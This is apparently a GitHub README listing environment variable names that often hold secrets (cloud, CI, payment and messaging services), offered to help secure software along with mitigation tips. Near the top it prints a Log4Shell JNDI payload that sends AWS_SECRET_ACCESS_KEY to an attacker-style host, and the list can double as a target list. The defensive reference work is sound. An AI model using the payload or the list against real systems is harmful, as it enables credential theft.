https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables

🤝 Show your support \- give a ⭐️ if you liked the content | [SHARE on Twitter](https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2FPuliczek%2Fawesome-list-of-secrets-in-environment-variables&via=pulik_io&text=Awesome%20list%20of%20secrets%20in%20environment%20variables) | Follow me on    
---

# **Awesome list of secrets in environment variables Awesome**

# **📝 Description**

List of secrets, passwords, API keys, tokens stored inside a system environment variables.  
An environment variable is a variable whose value is set outside the program, typically through functionality built into the operating system or microservice.  
Many developer documentations recommends storing secrets inside an environment variable, but is it the best way to keep secrets?  
The attacker can read values inside system environment variable by using exploits:

* CVE-2021-44228 JNDI log4j (JAVA) ([Read more...](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#1-system-environment-variables))  
  `${jndi:ldap://somesitehackerofhell.com/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}`  
  Get AWS\_SECRET\_ACCESS\_KEY or return NO\_EXISTS  
* CVE-XXXX-XXXX Web browser attack (Writeup/POC coming soon to my Github \- Follow me on [Github](https://github.com/Puliczek) and [Twitter](https://twitter.com/pulik_io) 😉  
* and much more...

Because of that I created, a list of secrets in environment variables to help secure software.  
Some of practices to avoid leak of secrets stored in environment variables is to:

* Block/notify on WAF when the request includes system environment variables  
* Store in system environment variable path to a config file, instead of clean value  
* Encrypt values inside environment variable  
* Use different way to store secrets 🤓

![Environment variables][image1]  
You can check your system environment variables:

* Windows execute in PowerShell: `dir env:`  
* Linux/MacOS execute in terminal: `printenv` or `env`

# **Awesome list of secrets in environment variables**

# **A**

## **AWS**

* AWS\_ACCESS\_KEY\_ID  
* AWS\_SECRET\_ACCESS\_KEY  
* AMAZON\_AWS\_ACCESS\_KEY\_ID  
* AMAZON\_AWS\_SECRET\_ACCESS\_KEY

source: [https://docs.aws.amazon.com/sdkref/latest/guide/setting-global-aws\_secret\_access\_key.html](https://docs.aws.amazon.com/sdkref/latest/guide/setting-global-aws_secret_access_key.html)

## **Algolia**

* ALGOLIA\_API\_KEY

source: [https://www.algolia.com/doc/framework-integration/symfony/getting-started/installation/?client=php](https://www.algolia.com/doc/framework-integration/symfony/getting-started/installation/?client=php)

## **Azure**

* AZURE\_CLIENT\_ID  
* AZURE\_CLIENT\_SECRET  
* AZURE\_USERNAME  
* AZURE\_PASSWORD  
* MSI\_ENDPOINT  
* MSI\_SECRET

source: [https://docs.microsoft.com/en-us/dotnet/api/azure.identity.environmentcredential?view=azure-dotnet](https://docs.microsoft.com/en-us/dotnet/api/azure.identity.environmentcredential?view=azure-dotnet)  
source: [https://techcommunity.microsoft.com/t5/azure-developer-community-blog/understanding-azure-msi-managed-service-identity-tokens-caching/ba-p/337406](https://techcommunity.microsoft.com/t5/azure-developer-community-blog/understanding-azure-msi-managed-service-identity-tokens-caching/ba-p/337406)

# **B**

## **Binance**

* binance\_api  
* binance\_secret

source: [https://algotrading101.com/learn/binance-python-api-guide/](https://algotrading101.com/learn/binance-python-api-guide/)

## **Bittrex**

* BITTREX\_API\_KEY  
* BITTREX\_API\_SECRET

source: [https://github.com/TeamWertarbyte/crypto-trading-bot/blob/development/README.md](https://github.com/TeamWertarbyte/crypto-trading-bot/blob/development/README.md)

# **C**

## **Cloud Foundry**

* CF\_PASSWORD  
* CF\_USERNAME

source: [https://cli.cloudfoundry.org/en-US/v6/auth.html](https://cli.cloudfoundry.org/en-US/v6/auth.html)

## **Code Climate**

* CODECLIMATE\_REPO\_TOKEN

source: [https://docs.codeclimate.com/docs/command-line-interface](https://docs.codeclimate.com/docs/command-line-interface)

## **Coveralls**

* COVERALLS\_REPO\_TOKEN

source: [https://docs.coveralls.io/supported-ci-services](https://docs.coveralls.io/supported-ci-services)

## **CircleCI**

* CIRCLE\_TOKEN

source: [https://circleci.com/docs/2.0/api-developers-guide/](https://circleci.com/docs/2.0/api-developers-guide/)

# **D**

## **Digitalocean**

* DIGITALOCEAN\_ACCESS\_TOKEN

source: [https://github.com/digitalocean/doctl\#authenticating-with-digitalocean](https://github.com/digitalocean/doctl#authenticating-with-digitalocean)

## **Dockerhub**

* DOCKER\_EMAIL  
* DOCKER\_PASSWORD  
* DOCKER\_USERNAME

source: [https://github.com/marketplace/actions/publish-docker](https://github.com/marketplace/actions/publish-docker)

## **Dockerhub**

* DOCKERHUB\_PASSWORD

source: [https://circleci.com/docs/2.0/env-vars/](https://circleci.com/docs/2.0/env-vars/)

# **E**

# **F**

## **Fastlane products**

* ITC\_PASSWORD

source: [https://github.com/phatblat/fastlane-variables](https://github.com/phatblat/fastlane-variables)

## **Facebook**

* FACEBOOK\_APP\_ID  
* FACEBOOK\_APP\_SECRET  
* FACEBOOK\_ACCESS\_TOKEN

## **Firebase**

* FIREBASE\_TOKEN  
* FIREBASE\_API\_TOKEN

source: [https://firebase.google.com/docs/cli](https://firebase.google.com/docs/cli)

## **Fossa**

* FOSSA\_API\_KEY

source: [https://docs.fossa.com/docs/api-reference](https://docs.fossa.com/docs/api-reference)

# **G**

## **Github**

* GH\_TOKEN  
* GITHUB\_TOKEN  
* GH\_ENTERPRISE\_TOKEN  
* GITHUB\_ENTERPRISE\_TOKEN

source: [https://cli.github.com/manual/gh\_help\_environment](https://cli.github.com/manual/gh_help_environment)

## **Gitlab**

* CI\_DEPLOY\_PASSWORD  
* CI\_DEPLOY\_USER

source: [https://docs.gitlab.com/ee/user/project/deploy\_tokens/](https://docs.gitlab.com/ee/user/project/deploy_tokens/)

## **Google Cloud**

* GOOGLE\_APPLICATION\_CREDENTIALS  
* GOOGLE\_API\_KEY

source: [https://cloud.google.com/docs/authentication/getting-started\#windows](https://cloud.google.com/docs/authentication/getting-started#windows)

## **Gitlab**

* CI\_DEPLOY\_USER  
* CI\_DEPLOY\_PASSWORD  
* GITLAB\_USER\_LOGIN  
* CI\_JOB\_JWT  
* CI\_JOB\_JWT\_V2  
* CI\_JOB\_TOKEN

source: [https://docs.gitlab.com/ee/ci/variables/predefined\_variables.html](https://docs.gitlab.com/ee/ci/variables/predefined_variables.html)

# **H**

## **Heroku**

* HEROKU\_API\_KEY  
* HEROKU\_API\_USER

source: [https://devcenter.heroku.com/articles/authentication](https://devcenter.heroku.com/articles/authentication)

# **I**

# **J**

# **K**

# **L**

# **M**

## **Mailgun**

* MAILGUN\_API\_KEY

source: [https://www.pulumi.com/registry/packages/mailgun/installation-configuration/](https://www.pulumi.com/registry/packages/mailgun/installation-configuration/)

## **MongoDB**

* MCLI\_PRIVATE\_API\_KEY  
* MCLI\_PUBLIC\_API\_KEY

[https://docs.mongodb.com/mongocli/stable/configure/environment-variables/](https://docs.mongodb.com/mongocli/stable/configure/environment-variables/)

# **N**

## **NGROK**

* NGROK\_TOKEN  
* NGROK\_AUTH\_TOKEN

source: \-

## **NPM**

* NPM\_TOKEN  
* NPM\_AUTH\_TOKEN

source: [https://docs.npmjs.com/using-private-packages-in-a-ci-cd-workflow](https://docs.npmjs.com/using-private-packages-in-a-ci-cd-workflow)

# **O**

## **OKTA**

* OKTA\_CLIENT\_ORGURL  
* OKTA\_CLIENT\_TOKEN  
* OKTA\_OAUTH2\_CLIENTSECRET  
* OKTA\_OAUTH2\_CLIENTID  
* OKTA\_AUTHN\_GROUPID

source: [https://developer.okta.com/okta-sdk-java/apidocs/com/okta/sdk/client/ClientBuilder.html](https://developer.okta.com/okta-sdk-java/apidocs/com/okta/sdk/client/ClientBuilder.html)

## **Oracle OpenStack command-line client**

* OS\_USERNAME  
* OS\_PASSWORD

source: [https://docs.openstack.org/ocata/user-guide/common/cli-set-environment-variables-using-openstack-rc.html](https://docs.openstack.org/ocata/user-guide/common/cli-set-environment-variables-using-openstack-rc.html)  
source: [https://docs.oracle.com/cd/E78305\_01/E78304/html/openstack-envars.html](https://docs.oracle.com/cd/E78305_01/E78304/html/openstack-envars.html)

# **P**

## **Percy.io**

* PERCY\_TOKEN

source: [https://docs.percy.io/docs/environment-variables](https://docs.percy.io/docs/environment-variables)

## **PostgreSQL**

* POSTGRES\_PASSWORD

source: [https://www.postgresql.org/docs/current/libpq-envars.html](https://www.postgresql.org/docs/current/libpq-envars.html)

# **Q**

# **R**

# **S**

## **Sauce Labs**

* SAUCE\_ACCESS\_KEY  
* SAUCE\_USERNAME

source: [https://docs.saucelabs.com/basics/environment-variables/](https://docs.saucelabs.com/basics/environment-variables/)

## **Sentry**

* SENTRY\_AUTH\_TOKEN

source: [https://docs.sentry.io/product/cli/configuration/](https://docs.sentry.io/product/cli/configuration/)

## **Slack**

* SLACK\_TOKEN

source: [https://slack.dev/node-slack-sdk/getting-started](https://slack.dev/node-slack-sdk/getting-started)

## **Square**

* square\_access\_token  
* square\_oauth\_secret

source: [https://www.npmjs.com/package/square/v/12.0.0?activeTab=readme](https://www.npmjs.com/package/square/v/12.0.0?activeTab=readme)

## **Stripe**

* STRIPE\_API\_KEY  
* STRIPE\_DEVICE\_NAME

source: [https://stripe.com/docs/cli/api\_keys](https://stripe.com/docs/cli/api_keys)

## **Surge**

* SURGE\_TOKEN  
* SURGE\_LOGIN

source: [https://surge.sh/help/integrating-with-circleci](https://surge.sh/help/integrating-with-circleci)

# **T**

## **Twilio**

* TWILIO\_ACCOUNT\_SID  
* TWILIO\_AUTH\_TOKEN

Source: [https://www.twilio.com/blog/2017/01/how-to-set-environment-variables.html](https://www.twilio.com/blog/2017/01/how-to-set-environment-variables.html)

## **Twitter**

* CONSUMER\_KEY  
* CONSUMER\_SECRET

source: [https://developer.twitter.com/en/docs/authentication/guides/authentication-best-practices](https://developer.twitter.com/en/docs/authentication/guides/authentication-best-practices)

## **Travis Ci**

* TRAVIS\_SUDO  
* TRAVIS\_OS\_NAME  
* TRAVIS\_SECURE\_ENV\_VARS

source: [https://docs.travis-ci.com/user/environment-variables](https://docs.travis-ci.com/user/environment-variables)

## **Telegram**

* TELEGRAM\_BOT\_TOKEN

# **U**

# **V**

## **Vault HashiCorp**

* VAULT\_TOKEN  
* VAULT\_CLIENT\_KEY

source: [https://www.vaultproject.io/docs/commands](https://www.vaultproject.io/docs/commands)

## **Vultr**

* TOKEN  
* VULTR\_ACCESS  
* VULTR\_SECRET

source: [https://www.vultr.com/docs/deploying-javascript-unikernels-to-vultr-with-ops](https://www.vultr.com/docs/deploying-javascript-unikernels-to-vultr-with-ops)

# **W**

# **X**

# **Y**

# **Z**

## **Get a RAW list:**

The repository includes the raw list:  
[raw\_list.txt](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables/blob/main/raw_list.txt)  
It is auto-generated from README.md by GitHub action.

# **😎 Contributing**

👍🎉 First off, thanks for taking the time to contribute\! 🎉👍  
If you would like to add more secrets:  
[Please read and follow our Contributing guide](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables/blob/main/CONTRIBUTING.md)  
Thanks\! 🦄

# **💻 Useful links**

* [Stackoverflow \- Is it secure to store passwords as environment variables (rather than as plain text) in config files?](https://stackoverflow.com/questions/12461484/is-it-secure-to-store-passwords-as-environment-variables-rather-than-as-plain-t)  
* [Google \- Best practices for securely using API keys](https://support.google.com/googleapi/answer/6310037?hl=en)  
* [An Introduction to Environment Variables and How to Use Them](https://medium.com/chingu/an-introduction-to-environment-variables-and-how-to-use-them-f602f66d15fa)  
* [Why you shouldn't use ENV variables for secret data](https://diogomonica.com/2017/03/27/why-you-shouldnt-use-env-variables-for-secret-data/)  
* [The Triumph and Tragedy of .env Files](https://blog.doppler.com/the-triumph-and-tragedy-of-env-files)

# **🤝 Show your support**

🤝 Show your support \- give a ⭐️ if you liked the content | [SHARE on Twitter](https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2FPuliczek%2Fawesome-list-of-secrets-in-environment-variables&via=pulik_io&text=Awesome%20list%20of%20secrets%20in%20environment%20variables) | Follow me on  

# **✔️ Disclaimer**

This project can only be used for educational purposes. Using this software against t  


[image1]: https://user-images.githubusercontent.com/12344862/147656611-8726c036-128b-4ad4-a19b-c019c2d6b1ea.png
